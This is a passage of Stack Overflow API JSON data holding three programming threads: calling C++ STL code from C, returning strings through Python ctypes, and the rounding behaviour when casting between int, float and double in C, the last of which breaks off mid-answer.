"https://www.gravatar.com/avatar/49b892be91856dd2bb85bcb5ac7f572b?s=128&d=identicon&r=PG&f=1", "display_name": "Jitendra", "link": "https://stackoverflow.com/users/5732970/jitendra"}, "is_accepted": false, "score": 0, "last_activity_date": 1482907486, "creation_date": 1482907486, "answer_id": 41356721, "question_id": 41355767, "link": "https://stackoverflow.com/questions/41355767/call-c-functions-containing-stl-data-types-from-c/41356721#41356721", "title": "Call C++ functions containing STL data types from C", "body": "<p>I have build all the file in g++, am not getting linking error. can you build all the source file to gcc or g++.</p>\n"}, {"tags": [], "owner": {"reputation": 100407, "user_id": 16406, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/fadf252892475e9b177d5cd5e8b24145?s=128&d=identicon&r=PG&f=1", "display_name": "Chris Dodd", "link": "https://stackoverflow.com/users/16406/chris-dodd"}, "is_accepted": true, "score": 2, "last_activity_date": 1482908897, "creation_date": 1482908897, "answer_id": 41357057, "question_id": 41355767, "link": "https://stackoverflow.com/questions/41355767/call-c-functions-containing-stl-data-types-from-c/41357057#41357057", "title": "Call C++ functions containing STL data types from C", "body": "<p>Compile the C file by itself with the C compiler:</p>\n\n<pre><code>gcc -c cfile.c\n</code></pre>\n\n<p>then link all the files with the C++ compiler:</p>\n\n<pre><code>g++ -o a.out main.o cfile.o mylib.o\n</code></pre>\n\n<p>Note that you <em>must</em> compile the file with the <code>main</code> function with the C++ compiler.  Any other files can be compiled with either, though you need <code>extern \"C\"</code> declarations to be able to call C code from C++ or create C++ functions that can be called from C</p>\n"}], "owner": {"reputation": 473, "user_id": 2935155, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/987d5791e3b9e6c9ce5fb52f305b98ee?s=128&d=identicon&r=PG&f=1", "display_name": "Saqib Shamsi", "link": "https://stackoverflow.com/users/2935155/saqib-shamsi"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 269, "favorite_count": 0, "accepted_answer_id": 41357057, "answer_count": 2, "score": 3, "last_activity_date": 1482908897, "creation_date": 1482902262, "last_edit_date": 1495541637, "question_id": 41355767, "link": "https://stackoverflow.com/questions/41355767/call-c-functions-containing-stl-data-types-from-c", "title": "Call C++ functions containing STL data types from C", "body": "<p>I have a function in C++ that uses data types like <code>vector</code> and <code>map</code> from STL. Here is some sample code:</p>\n\n<p><strong>mylib.cpp</strong></p>\n\n<pre><code>#include \"mylib.h\"\n#include&lt;vector&gt;\nusing namespace std;\n\n    int summation(int n) {\n    vector&lt;int&gt; numbers;\n    int sum = 0;\n    for(int i = 1; i &lt;=n; i++) \n        numbers.push_back(i);\n    for(int j = 0; j &lt; numbers.size(); j++)\n        sum += numbers[j];\n\n    return sum;\n    }\n</code></pre>\n\n<p>I created a header file as follows:</p>\n\n<p><strong>mylib.h</strong></p>\n\n<pre><code>#ifdef _cplusplus\nextern \"C\" {\n#endif\nextern int summation(int n);\n#ifdef _cplusplus\n};\n#endif\n</code></pre>\n\n<p>The C++ file was compiled into the obejct code using the command</p>\n\n<pre><code>g++ -o mylib.o -c mylib.cpp\n</code></pre>\n\n<p>Then, I wrote a C program in order to use the function <code>summation</code> from it.</p>\n\n<p><strong>main.c</strong></p>\n\n<pre><code>#include&lt;stdio.h&gt;\n#include \"mylib.h\"\n\nint main() {\n    int n;\n    scanf(\"%d\", &amp;n);\n    printf(\"%d\", summation(n));\n    return 0;\n}\n</code></pre>\n\n<p>Now, when I compile the C file above using <strong>gcc</strong>,</p>\n\n<pre><code>gcc main.c mylib.o\n</code></pre>\n\n<p>I get the following error</p>\n\n<pre><code>/tmp/ccAMN2ld.o: In function `main':\nmain.c:(.text+0x33): undefined reference to `summation'\nmylib.o: In function `std::vector&lt;int, std::allocator&lt;int&gt; &gt;::_M_insert_aux(__gnu_cxx::__normal_iterator&lt;int*, std::vector&lt;int, std::allocator&lt;int&gt; &gt; &gt;, int const&amp;)':\nmylib.cpp:(.text._ZNSt6vectorIiSaIiEE13_M_insert_auxEN9__gnu_cxx17__normal_iteratorIPiS1_EERKi[_ZNSt6vectorIiSaIiEE13_M_insert_auxEN9__gnu_cxx17__normal_iteratorIPiS1_EERKi]+0x26e): undefined reference to `__cxa_begin_catch'\nmylib.cpp:(.text._ZNSt6vectorIiSaIiEE13_M_insert_auxEN9__gnu_cxx17__normal_iteratorIPiS1_EERKi[_ZNSt6vectorIiSaIiEE13_M_insert_auxEN9__gnu_cxx17__normal_iteratorIPiS1_EERKi]+0x2d7): undefined reference to `__cxa_rethrow'\nmylib.cpp:(.text._ZNSt6vectorIiSaIiEE13_M_insert_auxEN9__gnu_cxx17__normal_iteratorIPiS1_EERKi[_ZNSt6vectorIiSaIiEE13_M_insert_auxEN9__gnu_cxx17__normal_iteratorIPiS1_EERKi]+0x2df): undefined reference to `__cxa_end_catch'\nmylib.o: In function `std::vector&lt;int, std::allocator&lt;int&gt; &gt;::_M_check_len(unsigned long, char const*) const':\nmylib.cpp:(.text._ZNKSt6vectorIiSaIiEE12_M_check_lenEmPKc[_ZNKSt6vectorIiSaIiEE12_M_check_lenEmPKc]+0x5b): undefined reference to `std::__throw_length_error(char const*)'\nmylib.o: In function `__gnu_cxx::new_allocator&lt;int&gt;::deallocate(int*, unsigned long)':\nmylib.cpp:(.text._ZN9__gnu_cxx13new_allocatorIiE10deallocateEPim[_ZN9__gnu_cxx13new_allocatorIiE10deallocateEPim]+0x1c): undefined reference to `operator delete(void*)'\nmylib.o: In function `__gnu_cxx::new_allocator&lt;int&gt;::allocate(unsigned long, void const*)':\nmylib.cpp:(.text._ZN9__gnu_cxx13new_allocatorIiE8allocateEmPKv[_ZN9__gnu_cxx13new_allocatorIiE8allocateEmPKv]+0x2c): undefined reference to `std::__throw_bad_alloc()'\nmylib.cpp:(.text._ZN9__gnu_cxx13new_allocatorIiE8allocateEmPKv[_ZN9__gnu_cxx13new_allocatorIiE8allocateEmPKv]+0x3c): undefined reference to `operator new(unsigned long)'\nmylib.o:(.eh_frame+0x4b): undefined reference to `__gxx_personality_v0'\ncollect2: error: ld returned 1 exit status\n</code></pre>\n\n<p>It is imperative that I use gcc to compile the C file. Is there a way to make it work?</p>\n\n<p>I tried looking for solution and stumbled upon the links below,</p>\n\n<p><a href=\"https://stackoverflow.com/questions/2744181/how-to-call-c-function-from-c\">How to call C++ function from C?</a></p>\n\n<p><a href=\"https://stackoverflow.com/questions/7281441/elegantly-call-c-from-c\">Elegantly call C++ from C</a></p>\n\n<p><a href=\"http://www.cplusplus.com/forum/general/8997/\" rel=\"nofollow noreferrer\">http://www.cplusplus.com/forum/general/8997/</a></p>\n\n<p>but couldn't find a solution to my problem.</p>\n"}, {"tags": ["python", "c"], "comments": [{"owner": {"reputation": 45, "user_id": 7314609, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dd7961ee560c79cba6163357e5530315?s=128&d=identicon&r=PG&f=1", "display_name": "Castor", "link": "https://stackoverflow.com/users/7314609/castor"}, "reply_to_user": {"reputation": 16936, "user_id": 7076153, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/erPUC.png?s=128&g=1", "display_name": "Stargateur", "link": "https://stackoverflow.com/users/7076153/stargateur"}, "edited": false, "score": 0, "creation_date": 1482903266, "post_id": 41355440, "comment_id": 69913592, "body": "@Stargateur Thanks! I should have assigned more."}], "answers": [{"comments": [{"owner": {"reputation": 45, "user_id": 7314609, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dd7961ee560c79cba6163357e5530315?s=128&d=identicon&r=PG&f=1", "display_name": "Castor", "link": "https://stackoverflow.com/users/7314609/castor"}, "edited": false, "score": 0, "creation_date": 1482911412, "post_id": 41356195, "comment_id": 69916818, "body": "Thank you so much! Your c codes show me a very professional way! I finally found a way to fix this bug, it caused by my ctypes configuration. And setting c_char_p to c_convert_to_16.argtypes does work, many thanks."}], "tags": [], "owner": {"reputation": 16936, "user_id": 7076153, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/erPUC.png?s=128&g=1", "display_name": "Stargateur", "link": "https://stackoverflow.com/users/7076153/stargateur"}, "is_accepted": true, "score": 2, "last_activity_date": 1483111805, "last_edit_date": 1483111805, "creation_date": 1482904709, "answer_id": 41356195, "question_id": 41355440, "link": "https://stackoverflow.com/questions/41355440/python-ctypes-cannot-get-long-string-value-returned-from-so-file/41356195#41356195", "title": "Python ctypes cannot get long string value returned from .so file", "body": "<p>I don't know much about ctypes in python but you should create your string like that <code>c_char_p(\"ABCDEFGHTUIKLL\")</code>.</p>\n\n<p>And maybe tell what argument take your function <code>c_convert_to_16.argtypes = [c_char_p, c_size_t]</code></p>\n\n<p>This will fix your undefined behavior in C:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\nchar *convert_to_16(char const *array, size_t const len);\n\nchar *convert_to_16(char const *array, size_t const len) {\n  size_t const len_buffer = len * 2 + 1;\n  char *buffer = malloc(len_buffer);\n  if (buffer == NULL) {\n    return NULL;\n  }\n  size_t used = 0;\n  for (size_t i = 0; i &lt; len; i++) {\n    if (len_buffer &lt; used || len_buffer - used &lt; 3) {\n      free(buffer);\n      return NULL;\n    }\n    int ret = snprintf(buffer + used, 3, \"%.2x\", (unsigned char)array[i]);\n    if (ret != 2) {\n      free(buffer);\n      return NULL;\n    }\n    used += 2;\n  }\n  return buffer;\n}\n\nint main(void) {\n  char const param[] = \"ABCDEFGHTUIKLL\";\n  printf(\"%s\\n\", param);\n  char *ret = convert_to_16(param, sizeof param - 1);\n  if (ret != NULL) {\n    printf(\"%s\\n\", ret);\n  }\n  free(ret);\n}\n</code></pre>\n"}], "owner": {"reputation": 45, "user_id": 7314609, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dd7961ee560c79cba6163357e5530315?s=128&d=identicon&r=PG&f=1", "display_name": "Castor", "link": "https://stackoverflow.com/users/7314609/castor"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 145, "favorite_count": 0, "accepted_answer_id": 41356195, "answer_count": 1, "score": 2, "last_activity_date": 1483111805, "creation_date": 1482899994, "question_id": 41355440, "link": "https://stackoverflow.com/questions/41355440/python-ctypes-cannot-get-long-string-value-returned-from-so-file", "title": "Python ctypes cannot get long string value returned from .so file", "body": "<p>I am learning C and trying to import a .so into my python file for higher performance by using a python package ctypes. So everything going well until I had a hard time when trying to get a string returned from .so file.</p>\n\n<p>C code:</p>\n\n<pre><code>char *convert_to_16(char *characters, int n){\n\n    char sub_buffer[3];\n    char code[3];\n    char *buffer = (char*)malloc(sizeof(characters) * 2);\n    for(int i=0; i &lt; n; i++){\n        strncpy(code, characters+i, 1);\n        sprintf(sub_buffer, \"%x\", *code);\n        strncat(buffer, sub_buffer, 2);\n    } \n    return buffer;\n}\n\n// main() only for test\nint main(){\n    char param[] = \"ABCDEFGHTUIKLL\";\n    printf(\"%s\\n\", param);\n    int length = strlen(param);\n    printf(\"%s\\n\", convert_to_16(param, length));\n}\n</code></pre>\n\n<p>It runs well with output:</p>\n\n<blockquote>\n  <blockquote>\n    <p>41424344454647485455494b4c4c</p>\n  </blockquote>\n</blockquote>\n\n<p>Python code :</p>\n\n<pre><code>c_convert_to_16 = ctypes.CDLL('./convert_to_16.so').convert_to_16\nc_convert_to_16.restype = ctypes.c_char_p\n\na_string = \"ABCDEFGHTUIKLL\"\nnew_16base_string = c_convert_to_16(a_string, len(a_string))\nprint new_16base_string\n</code></pre>\n\n<p>It runs but only returns two characters:</p>\n\n<blockquote>\n  <blockquote>\n    <p>41</p>\n  </blockquote>\n</blockquote>\n\n<p>I read the official doc and set restype as ctypes.c_char_p, and try to set it to other values. But it seems it's the only option, just oddly only two characters were returned.</p>\n\n<p>Is it the problem of my ctypes configuration or my C wasn't written correctly?\nMany thanks.</p>\n"}, {"tags": ["c", "floating-point", "ieee"], "comments": [{"owner": {"reputation": 16936, "user_id": 7076153, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/erPUC.png?s=128&g=1", "display_name": "Stargateur", "link": "https://stackoverflow.com/users/7076153/stargateur"}, "edited": false, "score": 3, "creation_date": 1482898489, "post_id": 41355213, "comment_id": 69912264, "body": "Drop your book, test the equality of two floating number is pointless."}, {"owner": {"reputation": 129565, "user_id": 1505939, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/131c67ef492a8d8352c6cf642a52e20f?s=128&d=identicon&r=PG", "display_name": "M.M", "link": "https://stackoverflow.com/users/1505939/m-m"}, "edited": false, "score": 1, "creation_date": 1482898563, "post_id": 41355213, "comment_id": 69912274, "body": "In general they could all be false. It&#39;s a stab in the dark as to what your textbook is expecting but perhaps you could read your book to see what it &quot;teaches&quot;"}, {"owner": {"reputation": 62072, "user_id": 16007, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/e859640aaeb4b305e163a990be827cf9?s=128&d=identicon&r=PG&f=1", "display_name": "old_timer", "link": "https://stackoverflow.com/users/16007/old-timer"}, "edited": false, "score": 0, "creation_date": 1482899184, "post_id": 41355213, "comment_id": 69912423, "body": "<a href=\"https://docs.oracle.com/cd/E19957-01/806-3568/ncg_goldberg.html\" rel=\"nofollow noreferrer\">docs.oracle.com/cd/E19957-01/806-3568/ncg_goldberg.html</a>"}, {"owner": {"reputation": 32386, "user_id": 4706785, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fdee2789e9bac57bfdd97abc4e533a4d?s=128&d=identicon&r=PG&f=1", "display_name": "Peter", "link": "https://stackoverflow.com/users/4706785/peter"}, "edited": false, "score": 0, "creation_date": 1482899191, "post_id": 41355213, "comment_id": 69912424, "body": "With some of those expressions, the answer is &quot;it depends&quot;.    Which is why testing equality of floating point values is often considered pointless,"}, {"owner": {"reputation": 5455, "user_id": 4115625, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2688a9684db617a20f9da3959e5890d7?s=128&d=identicon&r=PG&f=1", "display_name": "Danh", "link": "https://stackoverflow.com/users/4115625/danh"}, "edited": false, "score": 0, "creation_date": 1482900741, "post_id": 41355213, "comment_id": 69912792, "body": "x, y, z = 0 then ABCD always true, x,y,z is not a power of 2, I think it&#39;s false (not tested). That said, test the equality of 2 floating number is pointless"}, {"owner": {"reputation": 62072, "user_id": 16007, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/e859640aaeb4b305e163a990be827cf9?s=128&d=identicon&r=PG&f=1", "display_name": "old_timer", "link": "https://stackoverflow.com/users/16007/old-timer"}, "edited": false, "score": 4, "creation_date": 1482901228, "post_id": 41355213, "comment_id": 69912919, "body": "actually this is a very good exercise if you think about it.  They appear to be asking if you understand the clipping and rounding, how big the mantissa is relative to integers.  We know that equals in float is evil and that there is or are corner cases that are problematic, but the rest of the cases have some merit with the combinations they describe here."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1482901711, "post_id": 41355213, "comment_id": 69913030, "body": "What&#39;s the range of values returned by <code>random()</code> on this machine?  If the range is 0..RAND_MAX and RAND_MAX is 32767 (which is allowed by the standard for <code>rand()</code> \u2014 <code>random()</code> is non-standard), then the answers to some of the questions could be different from the answer if the range is larger (0..0x7FFFFFFF, for example)."}, {"owner": {"reputation": 21, "user_id": 7348130, "user_type": "registered", "profile_image": "https://graph.facebook.com/1814723838808041/picture?type=large", "display_name": "Tu\u1ea5n Ki\u1ec7t Nguy\u1ec5n Ho&#224;ng", "link": "https://stackoverflow.com/users/7348130/tu%e1%ba%a5n-ki%e1%bb%87t-nguy%e1%bb%85n-ho%c3%a0ng"}, "edited": false, "score": 0, "creation_date": 1482906808, "post_id": 41355213, "comment_id": 69914810, "body": "We are running programs on a machine where values of type int have a 32-bit two\u2019s-complement representation. Values of type float use the 32-bit IEEE format, and values of type double use the 64-bit IEEE format."}, {"owner": {"reputation": 16936, "user_id": 7076153, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/erPUC.png?s=128&g=1", "display_name": "Stargateur", "link": "https://stackoverflow.com/users/7076153/stargateur"}, "reply_to_user": {"reputation": 114796, "user_id": 214671, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/f82954c7134fbe63282dc033fd52f3ab?s=128&d=identicon&r=PG", "display_name": "Matteo Italia", "link": "https://stackoverflow.com/users/214671/matteo-italia"}, "edited": false, "score": 0, "creation_date": 1482912474, "post_id": 41355213, "comment_id": 69917231, "body": "@MatteoItalia &quot;bullshit&quot;? I never said that a floating number can&#39;t represent some integer precisely. Don&#39;t insult me, thanks. If you think that floating number should be taught in the way that can represent integer, it&#39;s your choice. But I will link you <b>EVERY</b> questions about bug because people use floating numbers like an integer. You talk about scripting language, here we talk about C. This is not the purpose of floating number and you <b>know</b> it."}, {"owner": {"reputation": 114796, "user_id": 214671, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/f82954c7134fbe63282dc033fd52f3ab?s=128&d=identicon&r=PG", "display_name": "Matteo Italia", "link": "https://stackoverflow.com/users/214671/matteo-italia"}, "reply_to_user": {"reputation": 16936, "user_id": 7076153, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/erPUC.png?s=128&g=1", "display_name": "Stargateur", "link": "https://stackoverflow.com/users/7076153/stargateur"}, "edited": false, "score": 4, "creation_date": 1482917774, "post_id": 41355213, "comment_id": 69919783, "body": "@Stargateur: teaching that testing the equality of floating point is pointless in general is just as counterproductive as ignoring the precision problems involved when you actually use them for FP stuff. People needs to learn how FP works and when they can do what with it - which is precisely what this exercise is trying to teach -, not dabble in cargo cult programming."}], "answers": [{"comments": [{"owner": {"reputation": 320781, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1482904646, "post_id": 41355295, "comment_id": 69913997, "body": "Not quite. Integers should always be represented without loss in floating-point numbers of sufficient size. e.g. Integers from -2^53 to +2^53 (inclusive) will be represented without loss in double-precision IEEE 754 floats. The range for single-precision is -2^24..+2^24. Some larger numbers can be represented without loss, but not all, and not the number one greater."}], "tags": [], "owner": {"reputation": 121, "user_id": 7141775, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/ufDWF.jpg?s=128&g=1", "display_name": "sopho-saksham", "link": "https://stackoverflow.com/users/7141775/sopho-saksham"}, "is_accepted": false, "score": -1, "last_activity_date": 1482898814, "creation_date": 1482898814, "answer_id": 41355295, "question_id": 41355213, "link": "https://stackoverflow.com/questions/41355213/casting-between-int-float-and-double-in-c/41355295#41355295", "title": "Casting between int, float and double in C", "body": "<p>Since you are just converting x,y,z to their double form , dx,dy,dz are nothing but x,y,z having some number of zeroes after a decimal. Depending upon compiler, it may happen that they are added with some other digit than zero. In that case , equality will not hold.\nFor example : x=5 and dx=5.000000 but it may happen dx is made 5.000001 because it is still almost equivalent to x. I also advise to not go in such pointless topic of equality of floating point numbers.</p>\n"}, {"tags": [], "owner": {"reputation": 62072, "user_id": 16007, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/e859640aaeb4b305e163a990be827cf9?s=128&d=identicon&r=PG&f=1", "display_name": "old_timer", "link": "https://stackoverflow.com/users/16007/old-timer"}, "is_accepted": false, "score": 3, "last_activity_date": 1482908660, "last_edit_date": 1482908660, "creation_date": 1482901075, "answer_id": 41355578, "question_id": 41355213, "link": "https://stackoverflow.com/questions/41355213/casting-between-int-float-and-double-in-c/41355578#41355578", "title": "Casting between int, float and double in C", "body": "<p>What casting is doing is converting from one thing to another.  It might be an 8 bit integer to a 16 bit or 32 bit</p>\n\n<pre><code>unsigned int x;\nunsigned char y;\n\ny = 7;\nx = (unsigned int) y;\n</code></pre>\n\n<p>which is implied of course if you did x=y;  assuming 8 and 32 bit typedefs here. goes from the bit pattern 0x07 to 0x00000007.</p>\n\n<p>This is actually a really fun exercise.  Lets make up a format and then ponder the questions.</p>\n\n<p>Floating point formats generally do something like this and we can think purely in positive numbers and work most of this exercise.  Take the number 1234 in base 10, we talk about scientific notation in grade school that would be 1.234 times ten to the 3 power.  base two computer formats work the same way there is a reason it is called FLOATING point.  the decimal moves around in a virtual sense.  So the number nine 0b1001 in float you would want to find the most significant one and put the decmal after it 1.001 times 2 to the power 3.  the number seventeen 1.0001 times 2 to the power 4.  Floating point has to cover the sign, it has to have some number of bits for the \"fraction\" or mantissa since we are forcing a fraction even with whole integer numbers.  and then an exponent.  we dont necessarily need to preserve the one before the decimal point that can be assumed in some formats.  of course zero is a special problem and the floating point format needs a special exception or pattern for that.  the format also needs some number of bits to represent the power of two that is applied.  for starters lets assume only positive integers are being generated and our integers are 8 bits so 0 to 0xFF is our entire world of integers.  Our double format has 12 fraction bits, our single has 5 for sake of argument.</p>\n\n<p>so what is our worst case number 0xFF which we can easily represent with 12 fraction bits 1.111111100000 times 2 to the power 7 and lets assume that our format has more than enough exponent bits to cover this entire exercise.</p>\n\n<p>so our double can hold every one of our integers, in C</p>\n\n<p>dx = double(x);</p>\n\n<p>just means convert formats  if we started with the bit pattern 00001001 which is the number 9 and in our made up double that would be 1.001000000000 times 2 to the power 3 the power being some more bits we store in our format but not relevant to this question.</p>\n\n<p>and in our made up single that number 9 is 1.00100 times 2 to the power 3.  </p>\n\n<p>but the number 0xFF in our single precision is 1.11111 times 2 to the power 7 when we convert that back to an integer it is 0xFC not 0xFF we lost some bits in the conversion.  assuming no rounding.  in base 10 1/27 is 0.0307307307...if we were to cut that off at 4 digits we would have 0.0307 which is a little bit low.  but if we took 3 0.031 with rounding that is a little bit too high.  if we look at 0xFF in our single it is 1.11111 with the next two bits being tossed are 11 which is more than a half so what if we rounded up 10.00000 times 2 to the 7th normalizes to 1.00000 times 2 to the 8th power.  0xFF rounded to 0x100 basically.  we could go with 0x100 representing 0xff or 0xFC representing 0xFF a little high or a little low but not exact, when we convert back we are either a little high or a little low.  that is exactly what is going on when you do these integer to float and back conversions.</p>\n\n<p>so look at the first case A\n(float)x vs (float)((double)x)\n1.00100 times 2 to the power 3 vs 1.001000000000 times 2 to the power 3.\ncovering float x vs double x then the double has to be converted, is the same clipping and rounding used between floating point formats as integer to float?\ndepends on the hardware but one would hope that 11111111 converts the same as 1.111111100000 but maybe it doesnt, in an ideal world it would. </p>\n\n<p>C is an interesting case and will say it this way, how many bits does it take to represent a two bit number plus a two bit number?   positive numbers worst case 3 + 3 = 6  how many bits scale that up 0xFF plus 0xFF now many bits is it more than 12 in our double format?  take 0xFF plus 0xFF plus 0xFF how many bits does that take? is it more than 12?  does re-arranging the grouping change that?</p>\n\n<p>D  two bit numbers 3*3 = 9 two bits in for each operand how many bits out?  0xFF times 0xFF?  then 0xFF times 0xFF times 0xFF does that take more than 12 bits?  Is the first question.  Second question if so then how does the clipping and rounding work?  Is the clipping and rounding affected by the grouping.  That is the brain bender so far, I may have to write a simple program to understand it. </p>\n\n<p>And E is not as nasty as I first thought, re-reading it.  I am dividing the bit pattern with the exact bit pattern.  What is our biggest problem with division not just computers but in general, what integer gives us a problem and do any others?  what if we allow signed numbers in here positive x divided by positive x and negative z divided by negative z?</p>\n\n<p>So search for double precision floating point at wikipedia then search for single precision.  how many \"fraction\" bits are there for double?  and assuming a 32 bit or 31 and a sign for an int do all the significant digits fit?  thinking positive numbers we would have a power of 2 to the 31st now many exponent bits does it take to represent the number 31? is there enough?  what about single can you hold 31 or 30 significant bits in the fraction?  can you represent a power of plus or minus 31 in the exponent?</p>\n\n<p>EDIT</p>\n\n<p>so thinking about case D I wrote a program.  I used 8 bits of fraction</p>\n\n<pre><code>//5 9 f 020140 030120 0301E0 090151 090152\n(5 * 9) * 15 vs 5 * (9 * 15)\n</code></pre>\n\n<p>so 5 is 1.01000000 or 0x1.40, 9 is 1.00100000 or 0x1.20 and 0xF is 1.11100000 or 0x1.E0.</p>\n\n<p>Multiplication in float is not the same as you would think, makes your brain hurt a little because we are not multiplying 5 times 9 directly we have shifted everything so that it is 1.something so it is instead </p>\n\n<pre><code>0x120 * 0x140 = 0x16800\n</code></pre>\n\n<p>and because of that normalization you chop off 8 bits and this is where\nI rounded as we will see, in this case the result is\n0x168 and no normalization is needed</p>\n\n<pre><code>5*9 = 0x2D = 101101\n1.01101000 0x1.68\n</code></pre>\n\n<p>I dont need to care about exponents but they just add 5 has an exponent of 2, 9 an exponent of 8 so the result is 0x168 with an exponent of 5\nso 0x168 times 0x1E0 = 0x2A300\nwe instantly chop off 8 bits 0x2A3 due to the nature of multiplication.\nnow we normalize we need 1.soemthing not 2.something so we shift right\nand increase the exponent so the exponent was 5+3=8 we give it one more 9\nbut notice something 0x2A3 0x1010100011 we are going to throw away a bit\nof precision instead of 0x1.51 and a half of a bit we have 0x1.51 the nature of base 2 floating point.  Now is that supposed to round up the answer?  perhaps. if so then the answer 0x1.52 </p>\n\n<pre><code>Take it the other way 5*(9*15)\n0x120*0x1E0 = 0x21C00\nor 0x21C  1000011100\n0x10E\n0x140*0x10E = 0x15180\nwe are going to lose a bit here\nis it 0x151 or 0x152?\n</code></pre>\n\n<p>And are these equivalent rounding questions?  Do both paths result in 0x152 making them equal or is one view of chopping off bits different than the other? If we dont round at all and just clip both answers are 0x152.</p>\n\n<pre><code>3 11 1f 010180 040110 0401F0 0A018B 0A018A\n(3*17)*31 vs 3*(17*31)  no rounding just clipping\n(3*17)*31\n0x180*0x110 = 0x19800\n0x198\n0x198*0x1F0 = 0x31680  0x316 0x1100010110\n0x18B\n3*(17*31)\n0x110*0x1F0 = 0x20f00\n0x107\n0x180*0x107 = 0x18A80\n0x18A\n0x18B != 0x18A\n</code></pre>\n\n<p>one path we clipped off two bits the other path just one.  Was that fair? \nthe 0x31680 taken as a whole </p>\n\n<pre><code>110001011010000000\n110001011 010000000 with discarded bits on the right\n</code></pre>\n\n<p>so looking at that that way 01 or 010 or 0100 is less than half that doesnt round up any more than a 3 or a 2 rounds up 1.33 does not round to 1.4 in base 10.</p>\n\n<p>but 0x20F00</p>\n\n<pre><code>100000111100000000\n100000111 100000000\n</code></pre>\n\n<p>that is right at the half way point 1/10, 10/100, 100/1000 that is a half.</p>\n\n<p>should that have been 0x108?</p>\n\n<pre><code>0x180*0x108 = 0x18C00\n0x18C\n0x18C != 0x18B\n</code></pre>\n\n<p>so viewing rounding that way, it still does not match ordering made a difference.</p>\n\n<p>Maybe you think I am doing rounding wrong and that is fair, and if so does that make all the possible integer patterns work?  assuming an int is 32 bits and double is IEEE754 with 52 bits of mantissa we are going to overflow that and have to chop off bits so chopping and rounding will happen, does ordering matter?</p>\n"}, {"tags": [], "owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "is_accepted": false, "score": 2, "last_activity_date": 1482944027, "last_edit_date": 1482944027, "creation_date": 1482922258, "answer_id": 41360457, "question_id": 41355213, "link": "https://stackoverflow.com/questions/41355213/casting-between-int-float-and-double-in-c/41360457#41360457", "title": "Casting between int, float and double in C", "body": "<p>C is a very portable language to many platforms - all sorts of processors and computers.  The results of the 5 equality tests vary from platform to platform.  Let us look to the C specification.</p>\n\n<hr>\n\n<p><code>int x = random();</code> is like saying for each of the following tests: \"How do the results behave for every <code>int</code>?\".  Let us look closer.</p>\n\n<p><code>random()</code> is not a standard C library function.  The name \"random\" hints that the function result is of the entire <code>int</code> range: <code>[INT_MIN...INT_MAX]</code> or <code>[0...INT_MAX]</code>.  Go with either one.</p>\n\n<p>=====================================================================</p>\n\n<p><code>int</code><br>\nC specifies that the <em>minimum</em> range of <code>int</code> is -(2<sup>15</sup>-1) to -(2<sup>15</sup>-1)  or -32,767 to 32,767.<br>\nCommonly, certainly not all, platforms use the range -(2<sup>31</sup>) to -(2<sup>31</sup>-1) or -2,147,483,648 to 2,147,483,647.<br>\nSome use the range -(2<sup>63</sup>) to (2<sup>63</sup>-1) or <em>about</em> -9*10<sup>18</sup> to 9*10<sup>18</sup>.<br>\nC does not specify the maximum size of the range.</p>\n\n<p><code>double</code><br>\nC specifies that the <em>minimum</em> range of <code>double</code> is -10<sup>37</sup> to 10<sup>37</sup>.<br>\nCommonly, certainly not all, platforms use the range about -1.8*10<sup>308</sup> to 1.8*10<sup>308</sup>.<br>\nC does not specify the maximum size of the range.  </p>\n\n<p><code>double</code> is floating point.  It represents number up to a certain precision.  Large whole numbers of the range are not all representable.  </p>\n\n<p>C specifies that the <em>minimum</em> range of <em>exactly representable whole numbers</em> <code>double</code> is -10<sup>9</sup> to 10<sup>9</sup>.<br>\nCommonly, this range of <em>exactly representable whole numbers</em> is about -9*10<sup>15</sup> to 9*10<sup>15</sup>.   </p>\n\n<p>The IEEE tag hints that <a href=\"https://en.wikipedia.org/wiki/Double-precision_floating-point_format\" rel=\"nofollow noreferrer\">binary64</a> is used.  We could go with that, but the FP selection does not change the results much as it is the width <code>int</code> range versus the <code>double</code>'s <em>exactly representable whole numbers</em> that is the key issue.  either one may be wider than the other.  <code>int</code> is commonly narrower.</p>\n\n<hr>\n\n<p>With <code>double dx = (double) x</code>, the conversion on many platforms is exact.  It is not exact on rare platforms where the range of 